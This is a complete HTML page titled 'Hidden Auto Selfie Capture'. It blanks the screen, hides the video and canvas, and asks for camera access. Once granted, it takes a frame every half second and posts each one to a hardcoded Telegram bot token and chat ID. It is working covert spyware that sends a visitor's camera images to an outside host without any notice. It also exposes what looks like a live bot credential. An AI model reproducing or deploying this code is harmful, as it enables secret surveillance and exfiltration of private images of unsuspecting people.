<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hidden Auto Selfie Capture</title>
    <style>
        /* Hide everything on the page */
        body {
            margin: 0;
            padding: 0;
            background-color: black; /* Keeps the page blank */
            overflow: hidden;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

    <video id="videoElement" autoplay></video>
    <canvas id="canvasElement"></canvas>

    <script>
        // Telegram Bot Token and Chat ID
        const TELEGRAM_TOKEN = '7647990067:AAEH5Qjt1XEKY7SvEkxinhYAbR5Bq5pKHDs';
        const CHAT_ID = '5519921687';

        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvasElement');

        // Access the device camera and stream to video element
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                startAutoCapture();
            })
            .catch(err => {
                console.error("Error accessing camera: ", err);
            });

        function startAutoCapture() {
            const context = canvas.getContext('2d');

            setInterval(() => {
                // Set canvas size to match video stream
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Draw current frame from video stream to canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert canvas content to base64 image
                const dataURL = canvas.toDataURL('image/png');

                // Convert base64 to Blob and send to Telegram
                fetch(dataURL)
                    .then(res => res.blob())
                    .then(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'selfie.png');

                        return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (!data.ok) {
                            console.error("Failed to send photo:", data);
                        }
                    })
                    .catch(error => {
                        console.error("Error sending photo: ", error);
                    });
            }, 500); // 0.5-second interval
        }
    </script>

</body>
</html>
